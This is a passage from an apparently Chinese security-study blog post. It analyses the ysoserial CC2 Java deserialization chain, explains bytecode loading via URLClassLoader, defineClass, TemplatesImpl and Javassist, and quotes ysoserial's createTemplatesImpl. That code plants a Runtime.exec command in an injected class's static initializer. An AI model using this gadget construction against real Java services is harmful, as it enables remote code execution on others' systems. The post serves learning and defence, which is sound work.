queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">		queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>

<p>要看懂ysoserial中的源码，我们首先需要学会一些前置知识，这里主要参考P神的Java安全漫谈。</p>
<h2 id="Java中动态加载字节码："><a href="#Java中动态加载字节码：" class="headerlink" title="Java中动态加载字节码："></a>Java中动态加载字节码：</h2><h3 id="什么是Java的“字节码”："><a href="#什么是Java的“字节码”：" class="headerlink" title="什么是Java的“字节码”："></a>什么是Java的“字节码”：</h3><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p>
<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。</p>
<p>甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513232506252.png" alt="image-20230513232506252"></p>
<p>或者这么理解，字节码相较于Java就相当于C语言之于Python，也就是Java语言的底层实现方式，当任意一个文件，只要最后编译后，是一个字节码文件，就可以在JVM中运行。</p>
<h3 id="利用URLClassLoader加载远程Class文件："><a href="#利用URLClassLoader加载远程Class文件：" class="headerlink" title="利用URLClassLoader加载远程Class文件："></a>利用URLClassLoader加载远程Class文件：</h3><p>在Java中，ClassLoader就是用来加载字节码文件最基础的方法，会告诉JVM如何加载这个类，默认的就是通过类的名字来加载类，比如<code>java.lang.Runtime</code>。</p>
<p>其中，有一个ClassLoader就是<code>URLClassLoader</code>类。</p>
<p><code>URLClassLoader</code>类实际上是我们平时默认使用的AppClassLoader的父类，所以我们基本上就是在理解默认的Java类加载器的工作原理。</p>
<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
<ol>
<li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li>
<li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li>
<li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li>
</ol>
<p>也就是说，如果我们使用的是HTTP协议，而不是file协议，就会通过URL来远程加载类。</p>
<p>理论上来讲，这里会有SSRF的风险。</p>
<p>P神给了一个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClassLoader</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception&#123; <span class="comment">//这里P神放了一个程序http://localhost:8000/Hello.class</span></span><br><span class="line">		URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;;</span><br><span class="line">		<span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">		<span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">		c.newInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到，通过<code>URLClassLoader.newInstance()</code>，创建一个新的URLClassLoader类，而这个URLClassLoader类，只能从<code>urls</code>变量对应的URL中加载字节码文件。</p>
<p>然后通过<code>loader.loadClass(&quot;Hello&quot;)</code>这段代码加载了Hello.class文件，也就是将这个类Class对象赋值给了变量c，这里等效于创建了一个反射，使用了ClassforName()函数。</p>
<p>所以后面使用c.newInstance()函数来创建对象。</p>
<h3 id="利用-ClassLoader-defineClass-直接加载字节码："><a href="#利用-ClassLoader-defineClass-直接加载字节码：" class="headerlink" title="利用 ClassLoader#defineClass 直接加载字节码："></a>利用 ClassLoader#defineClass 直接加载字节码：</h3><p>实际上，不管是远程加载class文件，还是本地加载class或是jar文件，Java中经历的都是下面这三个方法的调用过程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230514160245795.png" alt="image-20230514160245795"></p>
<p>也就是在ClassLoader类中，有三个函数的调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loadClass()-&gt;findClass()-&gt;defineClass()</span><br></pre></td></tr></table></figure>

<p>这三个函数的作用是：</p>
<ol>
<li><code>loadClass()</code>从已经加载的类缓存、父加载器等位置寻找类（其实就是双亲委派机制），在前面没有找到的情况下执行findClass</li>
<li><code>findClass()</code>根据基础URL指定的方法来加载类的字节码，可能会在本地文件系统，jar包，或是远程http服务器上读取字节码，然后交给下一个函数defineClass()</li>
<li><code>defineClass()</code>的作用就是处理前面传入的字节码，将其处理为真正的Java类。</li>
</ol>
<p>也就是说，整个字节码的加载过程中，最关键的部分其实是<code>ClassLoader#defineClass()</code>，正是这个方法决定了如何将一段字节流转变为一个Java类，Java默认的ClassLoader#defineClass是一个native方法，逻辑写在JVM的C语言代码中。</p>
<p>在这里，P神给了一个展示原理的代码：</p>
<p>这里首先要说明的是，<code>defineClass()</code>是一个受保护的方法，所以不能直接进行调用，必须要通过反射的方式来进行调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDefineClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span>ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class,<span class="type">byte</span>[].class,<span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">	defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">	<span class="type">byte</span>[] code =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA</span></span><br><span class="line"><span class="string">	Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs</span></span><br><span class="line"><span class="string">	bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh</span></span><br><span class="line"><span class="string">	L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry</span></span><br><span class="line"><span class="string">	ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n</span></span><br><span class="line"><span class="string">	OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA</span></span><br><span class="line"><span class="string">	AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">	<span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span>(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code,<span class="number">0</span>, code.length);</span><br><span class="line">	hello.newInstance();</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里通过反射，获取了ClassLoader类中的defineClass方法，然后调用这个方法，通过字符串的形式加载了这个类，也就是hello.class。</p>
<p>随后，通过newInstance()新建实例化。</p>
<p>在调用defineClass()这个方法时 ，里面的参数应该这么理解：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230514175849778.png" alt="image-20230514175849778"></p>
<p>也就是说，在上述代码中，我们调用的方法参数意义应该是；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code,0, code.length);</span><br></pre></td></tr></table></figure>

<p><code>ClassLoader.getSystemClassLoader</code>是我们给的一个系统类加载器，也就是应用程序类加载器，当我们调用defineClass()函数加载字节码的时候，我们时可以选择一个类加载器的。</p>
<p><code>Hello</code>是我们要定义的类的全限定名</p>
<p><code>code</code>是我们要定义的类的字节码数组</p>
<p>0是字节数组的起始位置</p>
<p><code>code.length</code>是我们传入的字节数组的长度。</p>
<p><strong>需要注意的是：</strong>在defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用器构造函数，初始化代码才能能被执行。</p>
<p>而且，即使是将初始化代码放在类的static块中，在<code>defineClass()</code>时候，也无法被直接调用到，因此如果我们想要使用defineClass在目标机上面执行任意代码，就需要想办法调用构造函数。</p>
<p>比如，使用newInstance()函数。</p>
<p>在实际场景中，因为defineClass方法作用域是不开放的，搜易攻击者很少能够直接利用到它，但是它是我们常用的一个攻击链<code>TemplatesImpl</code>的基础。</p>
<p>就像是我们现在看到的CC2链条一样。</p>
<h3 id="利用TemplatesImpl加载字节码："><a href="#利用TemplatesImpl加载字节码：" class="headerlink" title="利用TemplatesImpl加载字节码："></a>利用TemplatesImpl加载字节码：</h3><p>虽然大部分的开发者不会用到<code>defineClass()</code>方法，但是很少见的，在Java的一个底层类中，运用到了这个方法，也就是我们现在正在学习的<code>TemplatesImpl</code>类。</p>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
<p>这个类中，定义了一个内部类，<code>TransletClassLoader</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">         TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">             <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">            <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">            <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个内部类的最后对defineClass方法进行了一次重写，在这里，defineClass方法没有显式的声明其定义域，其作用域就是为default，也就是说这里的defineClass尤其父类的protected类型编程了一个default类型的方法，可以被类外部调用。</p>
<p>从<code>TransletClassLoader#defineClass()</code>向前看一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230521182631741.png" alt="image-20230521182631741"></p>
<p>在最前面的两个方法，<code>getOutputProperties()</code>和<code>newTransformer()</code>的作用域是public，可以被外部调用。</p>
<p>当我们执行到这条调用链的最后一步的时候，可以发现是通过对象loader来调用的<code>defineClass()</code>函数，这里调用的参数是<code>_bytecodes[i]</code>。</p>
<p>这里看一下defineClass()函数中，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以发现上面传入的<code>_bytecodes[i]</code>就是这里的参数b，也就是使用defineClass()来进行加载的字节码。</p>
<p>也就是说，我们可以通过反射的方式来对<code>_bytecodes</code>这个byte数组进行赋值，然后让其中的一个元素是我们构造的字节码就可以了。</p>
<p>这里需要注意的是在defineClass()函数中，第一个参数是null，这里就是代表直接使用字节码中的默认类名。</p>
<p>在P神给出的POC中，我们可以看到他设置了这么几个变量：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517002810205.png" alt="image-20230517002810205"></p>
<ol>
<li>bytecodes 是由字节码组成的数组； </li>
<li>_name 可以是任意字符串，只要不为null即可；</li>
<li><code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl</code> 对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。</li>
</ol>
<p>至于原因，首先是</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517003008577.png" alt="image-20230517003008577"></p>
<p>这里，我们要继续链，就不能让<code>_name</code>为null</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517003408424.png" alt="image-20230517003408424"></p>
<p>这里，因为我们创建一个新的TransletClassLoader类的时候，需要调用到方法，所以_tfactory有不能是null。</p>
<p><strong>还有一个值得注意的点</strong></p>
<p>另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须<br>是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类。</p>
<p>所以在获取字节码的时候必须要保证我们构造的类是AbstractTranslet的子类。</p>
<h3 id="Javassit库："><a href="#Javassit库：" class="headerlink" title="Javassit库："></a>Javassit库：</h3><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。<br> 能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。<br> Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。</p>
<p>向Maven的<code>Pom.xml</code>文件中，添加以下字段，以导入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/javassist/javassist --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.1.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517234943449.png" alt="image-20230517234943449"></p>
<p>在这个包中，主要调用到的方法是:</p>
<h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool:"></a>ClassPool:</h4><p>ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。</p>
<p>常用方法：</p>
<ul>
<li><code>static ClassPool getDefault()</code>：返回默认的ClassPool，一般通过该方法创建我们的ClassPool；</li>
<li><code>ClassPath insertClassPath(ClassPath cp)</code>：将一个ClassPath对象插入到类搜索路径的起始位置；</li>
<li><code>ClassPath appendClassPath</code>：将一个ClassPath对象加到类搜索路径的末尾位置；</li>
<li><code>CtClass makeClass</code>：根据类名创建新的CtClass对象；</li>
<li><code>CtClass get(java.lang.String classname)</code>：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用；</li>
</ul>
<h4 id="CtClass："><a href="#CtClass：" class="headerlink" title="CtClass："></a><strong>CtClass：</strong></h4><p> CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。</p>
<p>常用方法：</p>
<ul>
<li><code>void setSuperclass(CtClass clazz)</code>：更改超类，除非此对象表示接口；</li>
<li><code>byte[] toBytecode()</code>：将该类转换为类文件；</li>
<li><code>CtConstructor makeClassInitializer()</code>：制作一个空的类初始化程序（静态构造函数）；</li>
</ul>
<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p>获取字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(com.classloader.TemplatesImplEvil.class.getName());</span><br><span class="line"><span class="type">byte</span>[] code = clazz.toBytecode();</span><br></pre></td></tr></table></figure>

<p>创建一个新类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassit_test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//实例化一个ClassPool容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//新建一个CtClass，类名为Cat</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="comment">//设置一个要执行的命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;javassit_test succes!\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">//制作一个空的类初始化，并在前面插入要执行的命令语句</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">//重新设置一下类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//将生成的类文件保存下来</span></span><br><span class="line">        cc.writeFile();</span><br><span class="line">        <span class="comment">//加载该类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> cc.toClass();</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPerson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关于调用方式2的TemplatesImpl利用链分析："><a href="#关于调用方式2的TemplatesImpl利用链分析：" class="headerlink" title="关于调用方式2的TemplatesImpl利用链分析："></a>关于调用方式2的TemplatesImpl利用链分析：</h3><p>这条调用链，在前面部分都是一样，主要的区别是从</p>
<blockquote>
<p>InvokerTransformer.transform()</p>
</blockquote>
<p>开始的。</p>
<p>InvokerTransformer这个类，最关键的就是它的transform()函数，这个里面通过反射的方式完成了代码执行，这里我们首先看清楚这里调用的是哪一个方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173043146.png" alt="image-20230518173043146"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173052804.png" alt="image-20230518173052804"></p>
<p>在这里，我们可以发现，虽然一开始在实例化类的时候，这里写的是<code>toString()</code>方法，但是后面，通过反射的方式，将这里的方法名改成了<code>newTransformer</code>。也就是说，我们调用的是<code>newTransformer()</code>方法。</p>
<p>那么，我们调用的是哪个类中的<code>newTransformer()</code>方法呢。</p>
<p>因为InvokerTransformer#transoform()是反射传入的input参数，这里我们就需要知道传入的参数是哪个。</p>
<p>在我们之前的分析中，可以知道传入的参数是来自这里：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173514113.png" alt="image-20230518173514113"></p>
<p>第一个i是整形，后面的是queue数组中的一个元素。</p>
<p>也就是说这里，其实我们反射的input就是<code>queue[i]</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173710958.png" alt="image-20230518173710958"></p>
<p>这里可以看到，ysoserial通过反射的方式，修改了数组的第一个元素，为templates。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173818879.png" alt="image-20230518173818879"></p>
<p>也就是，我们调用的是templates这个对象中的newTransformer方法。</p>
<p>跟入：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519000006975.png" alt="image-20230519000006975"></p>
<p>可以看到，这里如果if中判定条件为true，则调用一个被重载过的createTemplatesImpl方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();<span class="comment">//创建了一个org.apache.xalan.xsltc.trax.TemplatesImpl的实例对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault(); <span class="comment">//创建一个ClassPool实例，默认方式</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class)); <span class="comment">//将内部类StubTransletPayload添加入路径</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));<span class="comment">//同上，但是这里是org.apache.xalan.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());<span class="comment">//获取对应类的CtClass对象。</span></span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">            <span class="string">&quot;\&quot;);&quot;</span>; <span class="comment">//定义指令</span></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);<span class="comment">//创建一个新的空初始化程序，添加静态程序块，像静态程序块中添加上述代码</span></span><br><span class="line">        <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">        clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());<span class="comment">//修改类名，类名中包含系统的纳秒级别时间，避免冲突</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());<span class="comment">//同上，但是这里是org.apache.xalan.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">        clazz.setSuperclass(superC);<span class="comment">//将superC设置为clazz的父类</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">            classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">        &#125;);<span class="comment">//反射方式，将字节码注入，就像我们之前的分析一样。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);<span class="comment">//随便设置一个字符串，不是null即可</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());<span class="comment">//同分析</span></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过上述代码分析，这里我们可以发现，我们已经成功的将<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>的字节码注入到了TemplatesImpl的defineClass()方法中，进行动态字节码加载。</p>
<p>且，这个类的父类是<code>org.apache.xalan.xsltc.runtime.AbstractTranslet</code>。</p>
<p>也就是说，这里我们调用函数返回的templates是一个特殊的<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>类。</p>
<p>回到之前，<code>InvokerTransformeri#transform()</code>，这里就是调用的上述类的<code>newTransformer()</code>方法。</p>
<p>这里，就回到了我们TemplatesImpl类调用的入口了。</p>
<p>随后，它会完成我们给他注入的字节码，然后开始调用其内部的static代码块，也就是这一部分：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519011659850.png" alt="image-20230519011659850"></p>
<p>完成rce。</p>
<p><strong>这里还有个小问题：</strong></p>
<p>我们知道，使用这种加载字节码的方式，在没有newInstance()的时候，是不会运行静态代码块中的内容的，这里是怎么做到的运行我们写的代码的？</p>
<p>以及为什么要将字节码的父类设为<code>org.apache.xalan.xsltc.runtime.AbstractTranslet</code>。</p>
<p>这两个问题其实可以一起解决：</p>
<p>这是因为，在<code>defineTransletClasses()</code>中，也就是我们调用load.defineClass()的部分，</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519013418964.png" alt="image-20230519013418964"></p>
<p>这里，会获取我们注入字节码，创建的类的父类。</p>
<p>如果父类是<code>ABSTRACT_TRANSLET</code>则将<code>_transletIndex</code>设为<code>i</code>。</p>
<p>这里即不会报错，同时，当函数执行结束，会返回到上一部分，也就是<code>getTransletInstance()</code>方法中。</p>
